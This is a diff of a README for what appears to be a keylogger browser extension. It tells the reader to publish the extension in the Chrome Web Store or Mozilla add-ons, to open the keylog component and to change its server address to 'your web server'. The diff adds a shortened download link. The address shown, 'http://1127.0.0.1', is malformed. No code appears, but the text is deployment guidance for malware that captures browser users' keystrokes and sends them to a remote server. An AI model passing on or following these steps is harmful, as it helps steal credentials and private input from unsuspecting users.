@@ -19,8 +19,7 @@ http://bit.ly/2VI9EwY
 
 -publish your extension in  chrome web store or adon mozilla ( video can found here http://bit.ly/2HnfniO )
 
-# how it works ? this projet was abandoned
-
+# how it works ? this projet was abandoned , download here https://bit.ly/2EQMees 
 1) open keylog
 
 change http://1127.0.0.1     to your web server 
